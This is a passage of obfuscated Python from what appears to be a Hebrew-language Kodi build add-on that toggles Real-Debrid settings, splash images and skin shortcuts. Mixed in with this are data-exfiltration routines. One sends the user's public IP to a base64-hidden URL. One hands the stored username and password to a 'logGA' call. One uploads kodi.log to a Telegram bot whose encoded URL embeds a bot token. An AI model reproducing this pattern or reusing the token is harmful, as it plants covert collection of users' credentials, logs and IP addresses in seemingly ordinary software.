          O0OO0O000OOO0O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:575
          O00OOOO0OO0O0O000 =str (json .loads (O0OO0O000OOO0O000 )['ip'])#line:576
          O0OOOO000O0OOOOOO =O0OO00O00O0OO00OO #line:577
          OO00OO00O000O0O0O =OOOOOO00O0000OO00 #line:578
          import socket #line:580
          O0OO0O000OOO0O000 =urllib2 .urlopen (OOOOOOOO00O0OO0OO .decode ('base64')+' - '+O0OOOO000O0OOOOOO +' - '+OO00OO00O000O0O0O +' - '+O0000OO0O00O00O0O ).readlines ()#line:581
       except :pass #line:582
def googleindicat ():#line:585
			import logg #line:586
			O0O0OOO0000000OO0 =(ADDON .getSetting ("pass"))#line:587
			O0OO0OO000OOO000O =(ADDON .getSetting ("user"))#line:588
			logg .logGA (O0O0OOO0000000OO0 ,O0OO0OO000OOO000O )#line:589
def logsend ():#line:590
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:591
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:592
      howsentlog ()#line:594
      import requests #line:595
      if xbmc .getCondVisibility ('system.platform.windows'):#line:596
         OOO00O0O0OO00OO00 =xbmc .translatePath ('special://home/kodi.log')#line:597
         O0O00OOOO000O0OO0 ={'chat_id':(None ,'-274262389'),'document':(OOO00O0O0OO00OO00 ,open (OOO00O0O0OO00OO00 ,'rb')),}#line:601
         O00O00O00OO0000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:602
         O0O0OOOOOO0O00O0O =requests .post (O00O00O00OO0000OO .decode ('base64'),files =O0O00OOOO000O0OO0 )#line:604
      elif xbmc .getCondVisibility ('system.platform.android'):#line:605
           OOO00O0O0OO00OO00 =xbmc .translatePath ('special://temp/kodi.log')#line:606
           O0O00OOOO000O0OO0 ={'chat_id':(None ,'-274262389'),'document':(OOO00O0O0OO00OO00 ,open (OOO00O0O0OO00OO00 ,'rb')),}#line:610
           O00O00O00OO0000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:611
           O0O0OOOOOO0O00O0O =requests .post (O00O00O00OO0000OO .decode ('base64'),files =O0O00OOOO000O0OO0 )#line:613
      else :#line:614
           OOO00O0O0OO00OO00 =xbmc .translatePath ('special://kodi.log')#line:615
           O0O00OOOO000O0OO0 ={'chat_id':(None ,'-274262389'),'document':(OOO00O0O0OO00OO00 ,open (OOO00O0O0OO00OO00 ,'rb')),}#line:619
           O00O00O00OO0000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:620
           O0O0OOOOOO0O00O0O =requests .post (O00O00O00OO0000OO .decode ('base64'),files =O0O00OOOO000O0OO0 )#line:622
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:623
def rdoff ():#line:625
	OOO0O0O0000OO0OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:626
	OOO0O0O0000OO0OOO .setSetting ('rd.client_id','')#line:627
	OOO0O0O0000OO0OOO .setSetting ('rd.secret','')#line:628
	OOO0O0O0000OO0OOO .setSetting ('rdsource','false')#line:629
	OOO0O0O0000OO0OOO .setSetting ('super_fast_type_toren','false')#line:630
	OOO0O0O0000OO0OOO .setSetting ('rd.auth','false')#line:631
	OOO0O0O0000OO0OOO .setSetting ('rd.refresh','false')#line:632
	OOO0O0O0000OO0OOO .setSetting ('magnet','false')#line:633
	OOO0O0O0000OO0OOO .setSetting ('torrent_server','false')#line:634
	OOO0O0O0000OO0OOO =xbmcaddon .Addon ('script.module.resolveurl')#line:636
	OOO0O0O0000OO0OOO .setSetting ('RealDebridResolver_client_id','')#line:637
	OOO0O0O0000OO0OOO .setSetting ('RealDebridResolver_client_secret','')#line:638
	OOO0O0O0000OO0OOO .setSetting ('RealDebridResolver_token','')#line:639
	OOO0O0O0000OO0OOO .setSetting ('RealDebridResolver_refresh','')#line:640
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:641
		OOO0O0O0000OO0OOO =xbmcaddon .Addon ('plugin.video.seren')#line:642
		OOO0O0O0000OO0OOO .setSetting ('rd.client_id','')#line:644
		OOO0O0O0000OO0OOO .setSetting ('rd.secret','')#line:645
		OOO0O0O0000OO0OOO .setSetting ('rd.auth','')#line:646
		OOO0O0O0000OO0OOO .setSetting ('rd.refresh','')#line:647
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:648
		OOO0O0O0000OO0OOO =xbmcaddon .Addon ('plugin.video.gaia')#line:649
		OOO0O0O0000OO0OOO .setSetting ('accounts.debrid.realdebrid.id','')#line:650
		OOO0O0O0000OO0OOO .setSetting ('accounts.debrid.realdebrid.secret','')#line:651
		OOO0O0O0000OO0OOO .setSetting ('accounts.debrid.realdebrid.token','')#line:652
		OOO0O0O0000OO0OOO .setSetting ('accounts.debrid.realdebrid.refresh','')#line:653
	resloginit .resloginit ('restore','all')#line:654
	O0O00OO0OOO0OOO0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:656
	O0O0O000OOOOOO0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:657
	copyfile (O0O00OO0OOO0OOO0O ,O0O0O000OOOOOO0O0 )#line:658
def skindialogsettind18 ():#line:659
	try :#line:660
		OOOO0O0OO00OO00O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:661
		OO0OOOOOO0OOOOOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:662
		copyfile (OOOO0O0OO00OO00O0 ,OO0OOOOOO0OOOOOO0 )#line:663
	except :pass #line:664
def rdon ():#line:665
	loginit .loginIt ('restore','all')#line:666
	OO0OOOOOOO00O000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:668
	O00O000OOO00O0000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:669
	copyfile (OO0OOOOOOO00O000O ,O00O000OOO00O0000 )#line:670
def adults18 ():#line:672
  OOO0OOOO00O00O0OO =(ADDON .getSetting ("adults"))#line:673
  if OOO0OOOO00O00O0OO =='true':#line:674
    OOOO0OO00OOO0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:675
    with open (OOOO0OO00OOO0OOO0 ,'r')as O0O0000O00O000OO0 :#line:676
      O0OOOO0O0O0O0OO00 =O0O0000O00O000OO0 .read ()#line:677
    O0OOOO0O0O0O0OO00 =O0OOOO0O0O0O0OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:695
    with open (OOOO0OO00OOO0OOO0 ,'w')as O0O0000O00O000OO0 :#line:698
      O0O0000O00O000OO0 .write (O0OOOO0O0O0O0OO00 )#line:699
def rdbuildaddon ():#line:700
  OOOOO0OO0000OOO0O =(ADDON .getSetting ("auto_rd"))#line:701
  if OOOOO0OO0000OOO0O =='true':#line:702
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:703
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:704
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:705
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:723
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:726
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:727
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:731
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:732
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:733
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:751
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:754
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:755
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:759
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:760
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:761
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:779
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:782
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:783
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:787
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:788
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:789
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:807
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:810
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:811
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:814
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:815
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:816
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:834
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:837
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:838
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:840
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:841
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:842
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:860
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:863
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:864
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:866
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:867
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:868
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:886
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:889
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:890
    O00OOO000O00O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:893
    with open (O00OOO000O00O0OOO ,'r')as OOO0OO000OOO0O0OO :#line:894
      O0O0OO000O000O000 =OOO0OO000OOO0O0OO .read ()#line:895
    O0O0OO000O000O000 =O0O0OO000O000O000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:913
    with open (O00OOO000O00O0OOO ,'w')as OOO0OO000OOO0O0OO :#line:916
      OOO0OO000OOO0O0OO .write (O0O0OO000O000O000 )#line:917
def rdbuildinstall ():#line:920
  try :#line:921
   O00O0000O0O00O000 =(ADDON .getSetting ("auto_rd"))#line:922
   if O00O0000O0O00O000 =='true':#line:923
     OO0O00O0OOO0O000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:924
     OOO0OOOO00OOOO0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:925
     copyfile (OO0O00O0OOO0O000O ,OOO0OOOO00OOOO0O0 )#line:926
  except :#line:927
     pass #line:928
def rdbuildaddonoff ():#line:931
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:934
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:935
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:936
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:954
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:957
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:958
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:962
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:963
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:964
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:982
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:985
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:986
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:990
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:991
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:992
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1010
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:1013
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:1014
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1018
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:1019
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:1020
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1038
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:1041
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:1042
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1045
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:1046
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:1047
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1065
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:1068
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:1069
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1071
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:1072
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:1073
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1091
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:1094
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:1095
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1097
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:1098
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:1099
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1117
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:1120
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:1121
    OOO0OO0O0OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1124
    with open (OOO0OO0O0OOOO0OOO ,'r')as OO00O000OOO0000O0 :#line:1125
      O00OOOOO00O00OOOO =OO00O000OOO0000O0 .read ()#line:1126
    O00OOOOO00O00OOOO =O00OOOOO00O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1144
    with open (OOO0OO0O0OOOO0OOO ,'w')as OO00O000OOO0000O0 :#line:1147
      OO00O000OOO0000O0 .write (O00OOOOO00O00OOOO )#line:1148
def rdbuildinstalloff ():#line:1151
    try :#line:1152
       OO0O00OO000OO00OO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1153
       OO0OOOOOOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1154
       copyfile (OO0O00OO000OO00OO ,OO0OOOOOOO0OOO00O )#line:1156
       OO0O00OO000OO00OO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1158
       OO0OOOOOOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1159
       copyfile (OO0O00OO000OO00OO ,OO0OOOOOOO0OOO00O )#line:1161
       OO0O00OO000OO00OO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1163
       OO0OOOOOOO0OOO00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1164
       copyfile (OO0O00OO000OO00OO ,OO0OOOOOOO0OOO00O )#line:1166
       OO0O00OO000OO00OO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1169
       OO0OOOOOOO0OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1170
       copyfile (OO0O00OO000OO00OO ,OO0OOOOOOO0OOO00O )#line:1172
    except :#line:1174
       pass #line:1175
